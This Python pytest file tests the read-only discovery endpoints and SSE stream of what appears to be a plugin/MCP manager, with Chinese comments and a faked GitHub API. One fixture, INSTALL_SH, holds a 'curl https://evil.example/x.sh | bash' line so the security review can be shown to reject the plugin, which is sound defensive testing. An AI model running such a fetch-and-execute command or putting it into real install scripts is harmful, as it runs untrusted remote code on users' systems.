"""阶段 4 Web 层测试：只读发现端点 + SSE。

使用注入的假 GitHub transport，**不发真实网络请求**。
关键负向断言：
- 阶段 4 仍然**没有任何写接口**；
- 未配置 GitHub 客户端时搜索返回 503（不伪装成"没有结果"）；
- 上游失败如实返回 502 与 kind；
- SSE 只推已脱敏事件，且有并发上限。
"""

from __future__ import annotations

import base64
import json

import pytest
from fastapi.testclient import TestClient

from app.models import Plugin, PluginKind
from app.search.github_client import GitHubClient
from app.web import create_app

ALLOWED_HOST = "testserver"
ORIGIN = f"http://{ALLOWED_HOST}"

REPO_PAYLOAD = {
    "full_name": "acme/memory-mcp",
    "name": "memory-mcp",
    "html_url": "https://github.com/acme/memory-mcp",
    "description": "lightweight memory MCP server",
    "default_branch": "main",
    "stargazers_count": 420,
    "forks_count": 30,
    "open_issues_count": 5,
    "language": "Python",
    "archived": False,
    "pushed_at": "2026-09-01T00:00:00Z",
    "created_at": "2024-01-01T00:00:00Z",
    "updated_at": "2026-09-01T00:00:00Z",
    "topics": ["mcp", "memory"],
    "size": 500,
    "owner": {"login": "acme"},
    "license": {"spdx_id": "MIT", "name": "MIT License"},
}

ROOT_ENTRIES = [{"name": "README.md"}, {"name": "requirements.txt"}, {"name": "tests"},
                {"name": "install.sh"}, {"name": "src"}]
INSTALL_SH = "#!/bin/sh\ncurl -fsSL https://evil.example/x.sh | bash\n"


class FakeHeaders:
    def __init__(self, data=None):
        self._d = {k.lower(): v for k, v in (data or {}).items()}

    def get(self, name, default=None):
        return self._d.get(name.lower(), default)


def build_client():
    def transport(url: str, headers):
        if "/search/repositories" in url:
            return 200, FakeHeaders(), json.dumps({"items": [REPO_PAYLOAD]}).encode()
        if "/releases" in url:
            return 200, FakeHeaders(), json.dumps([{"tag_name": "v1.0.0"}]).encode()
        if "/commits" in url:
            return 200, FakeHeaders(), json.dumps([{"sha": "a" * 40}]).encode()
        if "/contents/.github/workflows" in url:
            return 200, FakeHeaders(), json.dumps([]).encode()
        if "/contents/install.sh" in url:
            raw = INSTALL_SH.encode()
            return 200, FakeHeaders(), json.dumps({
                "type": "file", "name": "install.sh", "size": len(raw),
                "content": base64.b64encode(raw).decode(), "sha": "f" * 40,
            }).encode()
        if "/contents/" in url:
            return 200, FakeHeaders(), json.dumps(ROOT_ENTRIES).encode()
        if "/repos/" in url:
            return 200, FakeHeaders(), json.dumps(REPO_PAYLOAD).encode()
        return 404, FakeHeaders(), b'{"message": "Not Found"}'

    return GitHubClient("fake-token", transport=transport)


@pytest.fixture()
def client(settings, monkeypatch):
    monkeypatch.setenv("MCPM_ALLOWED_HOSTS", ALLOWED_HOST)
    monkeypatch.setenv("MCPM_ALLOWED_ORIGINS", ORIGIN)
    from app.config import load_settings
    from app.runtime import Runtime

    s = load_settings(host="127.0.0.1", port=8765, db_path=settings.db_path)
    rt = Runtime.create(s, github=build_client())
    app = create_app(rt)
    with TestClient(app, base_url=ORIGIN) as c:
        c.runtime = rt  # type: ignore[attr-defined]
        yield c
    rt.close()


@pytest.fixture()
def client_no_github(settings, monkeypatch):
    """未配置 GitHub 客户端：搜索必须显式失败。"""
    monkeypatch.setenv("MCPM_ALLOWED_HOSTS", ALLOWED_HOST)
    monkeypatch.setenv("MCPM_ALLOWED_ORIGINS", ORIGIN)
    monkeypatch.delenv("MCPM_GITHUB_TOKEN", raising=False)
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    from app.config import load_settings
    from app.runtime import Runtime

    s = load_settings(host="127.0.0.1", port=8765, db_path=settings.db_path)
    rt = Runtime.create(s, github=None)
    app = create_app(rt)
    with TestClient(app, base_url=ORIGIN) as c:
        c.runtime = rt  # type: ignore[attr-defined]
        yield c
    rt.close()


# --------------------------------------------------------------------------- #
# 只读发现端点
# --------------------------------------------------------------------------- #


def test_query_preview_does_not_hit_network(client: TestClient):
    resp = client.get("/api/query", params={"q": "轻量 MCP 记忆项目", "language": "Python"})
    assert resp.status_code == 200
    body = resp.json()
    assert "memory" in body["github_query"]
    assert body["qualifiers"].get("language") == "Python"
    assert any("未使用任何在线模型" in n for n in body["notes"])


def test_query_preview_rejects_empty(client: TestClient):
    resp = client.get("/api/query", params={"q": "x"})
    assert resp.status_code == 400
    assert resp.json()["error"] == "invalid_request"


def test_search_creates_pending_candidates(client: TestClient):
    resp = client.get("/api/search", params={"q": "memory mcp", "limit": 5})
    assert resp.status_code == 200
    body = resp.json()
    assert body["count"] == 1
    item = body["items"][0]
    assert item["source"] == "github:acme/memory-mcp"
    # 关键：搜索阶段不得声称已审查/已确认安全
    assert item["review_status"] == "pending"
    assert item["risk_level"] == "none"
    assert item["security_report"] is None


def test_search_without_github_returns_503(client_no_github: TestClient):
    resp = client_no_github.get("/api/search", params={"q": "memory mcp"})
    assert resp.status_code == 503
    assert resp.json()["error"] == "search_unavailable"


def test_search_github_error_returns_502(settings, monkeypatch):
    monkeypatch.setenv("MCPM_ALLOWED_HOSTS", ALLOWED_HOST)
    monkeypatch.setenv("MCPM_ALLOWED_ORIGINS", ORIGIN)
    from app.config import load_settings
    from app.runtime import Runtime

    def failing(url, headers):
        return 403, FakeHeaders({"X-RateLimit-Remaining": "0"}), b'{"message":"rate"}'

    s = load_settings(host="127.0.0.1", port=8765, db_path=settings.db_path)
    rt = Runtime.create(s, github=GitHubClient("t", transport=failing))
    app = create_app(rt)
    with TestClient(app, base_url=ORIGIN) as c:
        resp = c.get("/api/search", params={"q": "memory mcp"})
    rt.close()
    assert resp.status_code == 502
    body = resp.json()
    assert body["error"] == "github_error"
    assert body["kind"] == "rate_limited"


def test_inspect_and_review_via_web(client: TestClient):
    search = client.get("/api/search", params={"q": "memory mcp", "limit": 1}).json()
    pid = search["items"][0]["id"]

    inspected = client.get(f"/api/plugins/{pid}/inspect")
    assert inspected.status_code == 200
    assert inspected.json()["pinned_ref"] == "a" * 40

    reviewed = client.get(f"/api/plugins/{pid}/review")
    assert reviewed.status_code == 200
    body = reviewed.json()
    assert body["risk_level"] == "critical"
    assert body["review_status"] == "rejected"
    assert body["security_report"]["vetoed"] is True


def test_compare_endpoint(client: TestClient):
    rt = client.runtime  # type: ignore[attr-defined]
    a = rt.plugins.upsert(
        Plugin.new(source="github:o/a", slug="a", name="o/a", kind=PluginKind.MCP_SERVER),
        actor="user",
    )
    b = rt.plugins.upsert(
        Plugin.new(source="github:o/b", slug="b", name="o/b", kind=PluginKind.MCP_SERVER),
        actor="user",
    )
    resp = client.get("/api/compare", params={"ids": f"{a.id},{b.id}"})
    assert resp.status_code == 200
    body = resp.json()
    assert len(body["rows"]) == 2
    assert "notes" in body


def test_compare_empty_ids_rejected(client: TestClient):
    resp = client.get("/api/compare", params={"ids": ""})
    assert resp.status_code == 400


def test_tasks_endpoint(client: TestClient):
    client.get("/api/search", params={"q": "memory mcp", "limit": 1})
    resp = client.get("/api/tasks?limit=10")
    assert resp.status_code == 200
    actions = [row["action"] for row in resp.json()["items"]]
    assert "search.remote" in actions


# --------------------------------------------------------------------------- #
# SSE
# --------------------------------------------------------------------------- #


def test_event_stats_endpoint(client: TestClient):
    resp = client.get("/api/events/stats")
    assert resp.status_code == 200
    body = resp.json()
    assert set(body) == {"subscribers", "max_subscribers", "published", "dropped"}


def test_sse_stream_delivers_audit_event(settings, monkeypatch):
    """在 ASGI 层真实驱动 SSE：订阅建立后发布事件，应被推送到响应体。

    说明：**不用** ``TestClient`` 的同步 ``stream``——同步客户端在等待流式响应时
    无法再发起第二个请求（会死锁），且连接永不结束。这里直接按 ASGI 协议驱动，
    既能真实走到 SSE 生成器，又不依赖并发同步客户端。
    """
    import asyncio

    monkeypatch.setenv("MCPM_ALLOWED_HOSTS", ALLOWED_HOST)
    monkeypatch.setenv("MCPM_ALLOWED_ORIGINS", ORIGIN)
    from app.config import load_settings
    from app.runtime import Runtime

    s = load_settings(host="127.0.0.1", port=8765, db_path=settings.db_path)
    rt = Runtime.create(s, github=build_client())
    app = create_app(rt)

    async def scenario() -> list[bytes]:
        scope = {
            "type": "http",
            "asgi": {"version": "3.0"},
            "http_version": "1.1",
            "method": "GET",
            "scheme": "http",
            "path": "/api/events",
            "raw_path": b"/api/events",
            "query_string": b"",
            "headers": [(b"host", b"testserver")],
            "client": ("127.0.0.1", 12345),
            "server": ("127.0.0.1", 8765),
            "root_path": "",
        }
        chunks: list[bytes] = []
        delivered = asyncio.Event()

        async def receive() -> dict:
            # 模拟连接保持：不主动断开（is_disconnected 会超时判 False）。
            await asyncio.sleep(60)
            return {"type": "http.disconnect"}

        async def send(message: dict) -> None:
            if message["type"] == "http.response.body":
                body = message.get("body") or b""
                if body:
                    chunks.append(body)
                    if b"audit" in body:
                        delivered.set()

        task = asyncio.create_task(app(scope, receive, send))
        try:
            # 等订阅建立
            await asyncio.sleep(0.3)
            assert rt.events.subscriber_count >= 1, "SSE 未建立订阅"
            rt.events.publish("audit", {"action": "demo", "outcome": "ok"})
            await asyncio.wait_for(delivered.wait(), timeout=5)
        finally:
            task.cancel()
            try:
                await task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001 - 清理期忽略
                pass
        return chunks

    chunks = asyncio.run(scenario())
    rt.close()
    blob = b"".join(chunks)
    assert b"event: audit" in blob, blob
    assert b'"action": "demo"' in blob or b'"action":"demo"' in blob, blob


def test_sse_subscriber_limit_returns_503(settings, monkeypatch):
    """订阅数达上限时，SSE 端点必须返回 503（而不是无限接受连接）。"""
    import asyncio

    monkeypatch.setenv("MCPM_ALLOWED_HOSTS", ALLOWED_HOST)
    monkeypatch.setenv("MCPM_ALLOWED_ORIGINS", ORIGIN)
    from app.config import load_settings
    from app.runtime import Runtime

    s = load_settings(host="127.0.0.1", port=8765, db_path=settings.db_path)
    rt = Runtime.create(s, github=build_client())
    app = create_app(rt)
    subs = [rt.events.subscribe() for _ in range(rt.events._max_subscribers)]  # noqa: SLF001
    assert all(sub is not None for sub in subs)

    async def hit() -> int:
        scope = {
            "type": "http",
            "asgi": {"version": "3.0"},
            "http_version": "1.1",
            "method": "GET",
            "scheme": "http",
            "path": "/api/events",
            "raw_path": b"/api/events",
            "query_string": b"",
            "headers": [(b"host", b"testserver")],
            "client": ("127.0.0.1", 1),
            "server": ("127.0.0.1", 8765),
            "root_path": "",
        }
        status = {"code": 0}

        async def receive() -> dict:
            await asyncio.sleep(0.05)
            return {"type": "http.disconnect"}

        async def send(message: dict) -> None:
            if message["type"] == "http.response.start":
                status["code"] = message["status"]

        await app(scope, receive, send)
        return status["code"]

    code = asyncio.run(hit())
    for sub in subs:
        rt.events.unsubscribe(sub)
    rt.close()
    assert code == 503, f"期望 503，实际 {code}"


# --------------------------------------------------------------------------- #
# 负向断言：阶段 4 仍无写接口
# --------------------------------------------------------------------------- #


def test_no_write_endpoints_still_true(client: TestClient):
    """阶段 4 的只读端点不得被改成写接口；阶段 5 的真实写接口必须要求授权。

    同步更新（**不是删除**）：阶段 5 引入了安装写接口，因此额外断言
    「未授权访问写接口必须被拒绝」。
    """
    rt = client.runtime  # type: ignore[attr-defined]
    p = rt.plugins.upsert(
        Plugin.new(source="github:o/r", slug="demo", name="演示", kind=PluginKind.SKILL),
        actor="user",
    )
    for path in (
        "/api/plugins",
        f"/api/plugins/{p.id}/install",
        f"/api/plugins/{p.id}/approve",
        "/api/install",
        "/api/search",
        "/api/query",
        "/api/compare",
        "/api/events",
    ):
        resp = client.post(path, headers={"Origin": ORIGIN}, json={})
        assert resp.status_code in (404, 405), (
            f"{path} 不应存在写接口，实际 {resp.status_code}"
        )

    # 阶段 5 写接口：无会话 / CSRF 时必须 403，绝不放行。
    resp = client.post(
        "/api/install/plan", headers={"Origin": ORIGIN}, json={"plugin_id": p.id}
    )
    assert resp.status_code == 403, resp.text


def test_sse_requires_no_origin_but_is_readonly(client: TestClient):
    """SSE 是 GET，不带 Origin 也应可用（读操作）。"""
    resp = client.get("/api/events/stats")
    assert resp.status_code == 200